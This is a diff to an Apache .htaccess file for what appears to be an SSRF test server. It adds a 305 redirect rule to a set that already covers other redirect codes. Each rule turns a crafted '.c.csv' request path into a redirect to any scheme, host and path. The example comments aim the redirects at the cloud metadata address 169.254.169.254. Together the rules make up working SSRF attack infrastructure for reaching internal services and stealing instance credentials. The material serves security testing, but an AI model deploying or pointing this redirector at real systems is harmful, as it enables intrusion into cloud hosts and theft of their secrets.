@@ -3,6 +3,7 @@ ErrorDocument 300 "Device Name,Platform,OS"
 ErrorDocument 301 "Device Name,Platform,OS"
 ErrorDocument 302 "Device Name,Platform,OS"
 ErrorDocument 303 "Device Name,Platform,OS"
+ErrorDocument 305 "Device Name,Platform,OS"
 ErrorDocument 307 "Device Name,Platform,OS"
 ErrorDocument 308 "Device Name,Platform,OS"
 
@@ -33,6 +34,13 @@ RewriteRule 302-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=302,NC]
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).c.csv$
 RewriteRule 303-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=303,NC]
+
+# 305 with response body
+# https://ssrf.localdomain.pw/csv-with-body/305-https-169.254.169.254:80-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body/305-https-169.254.169.254:80-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 305-([^/-]*)-([^/-]*)-(.*).c.csv$
+RewriteRule 305-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=305,NC]
 
 # 307 with response body
 # https://ssrf.localdomain.pw/csv-with-body/307-https-169.254.169.254:80-.c.csv
